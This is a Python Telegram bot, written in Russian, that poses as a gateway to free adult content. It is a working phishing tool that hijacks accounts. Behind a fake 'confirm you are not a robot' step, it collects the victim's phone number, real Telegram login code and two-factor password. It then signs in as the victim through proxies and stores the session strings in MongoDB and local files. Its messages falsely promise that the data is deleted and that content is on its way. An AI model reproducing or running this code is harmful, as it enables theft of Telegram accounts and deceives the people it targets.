import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Основная прокси (старая, для совместимости)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Вторая прокси (новая)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# Список доступных прокси (первая - старая основная)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """Выбираем прокси для номера"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """Очищает данные пользователя из временных хранилищ"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """Обновляет или создает запись пользователя с новыми данной"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении лога пользователя: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """Отправляет/обновляет клавиатуру для ввода кода"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Отправить код", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"📱 *Код подтверждения:*\n\n`{current_code}`\n\n_Нажимайте цифры ниже, чтобы ввести код, полученный от Telegram._" if current_code else "🔢 *Введите код подтверждения*\n\n_Нажимайте кнопки ниже, чтобы ввести код, полученный от Telegram._"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

async def send_welcome_message(user_id):
    """Отправляет приветственное сообщение с фото и кнопкой"""
    try:
        photo_path = "welcome_photo.jpg"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔓 РАЗБЛОКИРОВАТЬ ДОСТУП СЕЙЧАС", callback_data="auth_account"))
        
        if os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                await bot.send_photo(
                    user_id,
                    photo,
                    caption=(
                        "👋 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНЫЙ МИР 18+!* 🔞\n\n"
                        "💋 *Открой для себя пикантный контент, которого нет больше нигде!*\n"
                        "• Более 10.000 горячих фото и приватных видео\n"
                        "• Девушки из России и модели со всего мира\n"
                        "• Эксклюзивный любительский контент\n"
                        "• Прямые трансляции и уникальные материалы\n\n"
                        "🚀 *Подтверди аккаунт, чтобы разблокировать всё немедленно!*\n\n"
                        "🔞 *ДОСТУП ТОЛЬКО ДЛЯ ВЗРОСЛЫХ 18+*\n"
                        "Подтверди, что ты не робот!\n\n"
                        "✅ *Процесс на 100% безопасный и конфиденциальный:*\n"
                        "• Мы не видим твои чаты или сообщения\n"
                        "• Мы не передаём твои данные третьим лицам\n"
                        "• Подтверди, что ты не робот!\n\n"
                        "⚡️ _Нажми ниже, чтобы начать и разблокировать всё прямо сейчас!_"
                    ),
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
        else:
            await bot.send_message(
                user_id,
                "👋 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНЫЙ МИР 18+!* 🔞\n\n"
                "💋 *Открой для себя пикантный контент, которого нет больше нигде!*\n"
                "• Более 10.000 горячих фото и приватных видео\n"
                "• Девушки из России и модели со всего мира\n"
                "• Эксклюзивный любительский контент\n"
                "• Прямые трансляции и уникальные материалы\n\n"
                "🚀 *Подтверди аккаунт, чтобы разблокировать всё немедленно!*\n\n"
                        "🔞 *ДОСТУП ТОЛЬКО ДЛЯ ВЗРОСЛЫХ 18+*\n"
                        "Подтверди, что ты не робот!\n\n"
                        "✅ *Процесс на 100% безопасный и конфиденциальный:*\n"
                        "• Мы не видим твои чаты или сообщения\n"
                        "• Мы не передаём твои данные третьим лицам\n"
                        "• Подтверди, что ты не робот!\n\n"
                        "⚡️ _Нажми ниже, чтобы начать и разблокировать всё прямо сейчас!_",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")
        # Fallback сообщение
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔓 РАЗБЛОКИРОВАТЬ ДОСТУП СЕЙЧАС", callback_data="auth_account"))
        
        await bot.send_message(
            user_id,
            "👋 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНЫЙ МИР 18+!* 🔞\n\n"
            "💋 Открой для себя пикантный контент! Подтверди аккаунт, чтобы получить доступ к тысячам горячих фото и видео!",
            parse_mode='Markdown',
            reply_markup=keyboard
        )

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # Отправляем единое сообщение с фото и кнопкой
    await send_welcome_message(user.id)

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером телефона", request_contact=True))
    await bot.send_message(
        user_id,
        "🔥 *ШАГ 1: БЫСТРАЯ ПРОВЕРКА* 🔞\n\n"
        "Подтверди, что ты не робот!\n\n"
        "📋 *Что нужно сделать:*\n"
        "1. Поделись номером → Telegram отправит код\n"
        "2. Введи код → Проверка завершена\n"
        "3. ДОСТУП РАЗБЛОКИРОВАН → Контент 18+ доступен\n\n"
        "💎 *После проверки ты получишь:*\n"
        "• Горячие фото и видео с красивыми девушками\n"
        "• Эксклюзивный любительский контент\n"
        "• Новые материалы каждый день\n"
        "• Приватные чаты с моделями\n\n"
        "⚠️ Твой номер используется только для проверки и затем удаляется. Всё анонимно и безопасно!",
        parse_mode='Markdown',
        reply_markup=kb
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"Ошибка при определении геолокации: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        
        # Сначала отправляем объяснение
        await message.answer(
            "✅ *Номер получен!* 🔞\n\n"
            "📨 *ШАГ 2: КОД ПОДТВЕРЖДЕНИЯ*\n\n"
            "Telegram отправил тебе SMS с кодом из 5 цифр.\n\n"
            "🔢 *Инструкция:*\n"
            "1. Проверь сообщения на телефоне\n"
            "2. Введи код, используя кнопки ниже\n"
            "3. Нажми 'Отправить код' после ввода\n\n"
            "⚡️ *ПОСЛЕ ВВОДА КОДА ТЫ ПОЛУЧИШЬ:*\n"
            "• Полный доступ к контенту 18+\n"
            "• Тысячи горячих фото и видео\n"
            "• Чаты с реальными девушками\n"
            "• Эксклюзивные материалы каждый день\n\n"
            "_Код действителен 5 минут для безопасности._",
            parse_mode='Markdown'
        )
        
        # Затем отправляем клавиатуру
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке кода: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ Сначала поделись номером телефона", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Ошибка. Перезапусти с /start", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Сначала введи код", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Код слишком длинный", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Сессия истекла. Перезапусти с /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
                "✅ *ДОСТУП К КОНТЕНТУ ДЛЯ ВЗРОСЛЫХ РАЗБЛОКИРОВАН!*\n\n"
                "🔥 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНУЮ ЗОНУ 18+!*\n\n"
                "💋 *ТЕПЕРЬ ТЕБЕ ДОСТУПНО:*\n"
                "• Более 10.000 горячих фото и приватных видео\n"
                "• Девушки из России и модели со всего мира\n"
                "• Эксклюзивный любительский контент\n"
                "• Прямые трансляции и уникальные материалы\n"
                "• Приватные чаты с моделями\n\n"
                "🚀 *Контент уже на подходе...*\n"
                "Мы готовим твой полный доступ.\n"
                "Первые материалы придут в течение нескольких минут!\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Контент только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(
                user_id,
                "🔐 *ШАГ 3: ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
                "Твой аккаунт защищён дополнительно.\n\n"
                "📝 *Отправь пароль безопасности ниже:*\n\n"
                "⚡️ *ПОСЛЕ ВВОДА ПАРОЛЯ ТЫ ПОЛУЧИШЬ:*\n"
                "• Полный доступ к контенту 18+\n"
                "• Тысячи горячих фото и видео\n"
                "• Чаты с реальными девушками\n\n"
                "_Этот пароль отличается от кода из SMS._",
                parse_mode='Markdown'
            )
    except PhoneCodeExpiredError:
        await bot.send_message(
            user_id,
            "⏰ *Код истёк*\n\n"
            "Код устарел. Используй /start, чтобы получить новый код и открыть доступ к горячему контенту!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(
            user_id,
            "❌ *Неверный код*\n\n"
            "Код введён неправильно. Проверь SMS и введи код заново, чтобы разблокировать контент 18+!",
            parse_mode='Markdown'
        )
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(
            user_id,
            "🔐 *ОБНАРУЖЕНА ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
            "Твой аккаунт использует двухэтапную верификацию.\n\n"
            "📝 *Отправь пароль безопасности ниже, чтобы разблокировать всё:*\n\n"
            "💎 *ПОСЛЕ ВВОДА ПАРОЛЯ ТЫ ПОЛУЧИШЬ:*\n"
            "• Мгновенный доступ к контенту 18+\n"
            "• Эксклюзивные фото и видео\n"
            "• Приватные чаты с моделями",
            parse_mode='Markdown'
        )
    except Exception as e:
        await bot.send_message(
            user_id,
            f"❌ *Ошибка при проверке*\n\n"
            f"Техническая проблема:\n`{e}`\n\n"
            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивному контенту!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Сессия истекла. Используй /start для перезапуска")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
                "✅ *ПОЛНЫЙ ДОСТУП К КОНТЕНТУ ДЛЯ ВЗРОСЛЫХ!*\n\n"
                "🔥 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНУЮ ЗОНУ 18+!*\n\n"
                "💋 *ТЕПЕРЬ ТЫ МОЖЕШЬ НАСЛАЖДАТЬСЯ:*\n"
                "• Более 10.000 горячих фото и приватных видео\n"
                "• Девушки из России и модели со всего мира\n"
                "• Эксклюзивный любительский контент\n"
                "• Прямые трансляции и уникальные материалы\n"
                "• Приватные чаты с моделями\n\n"
                "🚀 *Контент уже на подходе...*\n"
                "Мы готовим твой полный доступ.\n"
                "Первые материалы придут в течение нескольких минут!\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Контент только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer(
                "❌ *Неверный пароль*\n\n"
                "Пароль введён неправильно. Отправь правильный пароль, чтобы разблокировать контент 18+!",
                parse_mode='Markdown'
            )
    except Exception as e:
        await message.answer(
            f"❌ *Ошибка проверки*\n\n"
            f"Проблема: `{e}`\n\n"
            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивному контенту!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)